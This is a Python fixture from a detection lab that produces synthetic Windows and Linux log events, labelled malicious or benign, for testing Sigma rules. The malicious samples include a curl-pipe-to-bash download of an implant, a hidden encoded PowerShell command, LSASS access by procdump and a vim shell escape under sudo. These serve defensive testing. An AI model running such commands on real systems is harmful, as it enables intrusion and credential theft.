"""
Generates synthetic log events shaped like real Sysmon/auditd output —
enough to exercise the Sigma rules in this lab without needing a live
endpoint agent. Each event is tagged with whether it's expected to be
malicious, purely so tests/demos can assert detection coverage — this
label is NOT something a rule would see (rules only see the fields real
logs would actually contain).
"""

def get_sample_events() -> list:
    return [
        # --- Windows process_creation events ---
        {
            "_label": "malicious",
            "_expected_rule": "Suspicious PowerShell Encoded Command Execution",
            "EventType": "process_creation",
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -enc SGVsbG8gV29ybGQ= -ExecutionPolicy Bypass -WindowStyle Hidden",
        },
        {
            "_label": "benign",
            "EventType": "process_creation",
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe Get-ChildItem C:\\Users",
        },
        # --- Windows process_access (LSASS) events ---
        {
            "_label": "malicious",
            "_expected_rule": "Potential LSASS Memory Dump via Process Access",
            "EventType": "process_access",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "SourceImage": r"C:\Users\Public\procdump64.exe",
        },
        {
            "_label": "benign",
            "EventType": "process_access",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "SourceImage": r"C:\Windows\System32\services.exe",
        },
        # --- Linux process_creation (cron persistence) ---
        {
            "_label": "malicious",
            "_expected_rule": "Suspicious Cron Job Creation",
            "EventType": "process_creation",
            "CommandLine": "curl http://198.51.100.23/implant.sh | bash",
        },
        {
            "_label": "malicious",
            "_expected_rule": "Suspicious Cron Job Creation",
            "EventType": "process_creation",
            "CommandLine": "crontab -l",
        },
        {
            "_label": "benign",
            "EventType": "process_creation",
            "CommandLine": "ls -la /var/log",
        },
        # --- Linux sudo / GTFOBins-style privilege escalation ---
        {
            "_label": "malicious",
            "_expected_rule": "Sudo Privilege Escalation via NOPASSWD Abuse",
            "EventType": "process_creation",
            "CommandLine": "sudo vim -c ':!/bin/sh'",
        },
        {
            "_label": "benign",
            "EventType": "process_creation",
            "CommandLine": "sudo apt-get update",
        },
        # --- SSH auth ---
        {
            "_label": "malicious",
            "_expected_rule": "SSH Authentication Failure (Possible Brute Force Precursor)",
            "EventType": "ssh_auth_failure",
            "SourceIP": "203.0.113.55",
            "Username": "root",
        },
        {
            "_label": "benign",
            "EventType": "ssh_auth_success",
            "SourceIP": "10.0.0.5",
            "Username": "alice",
        },
    ]
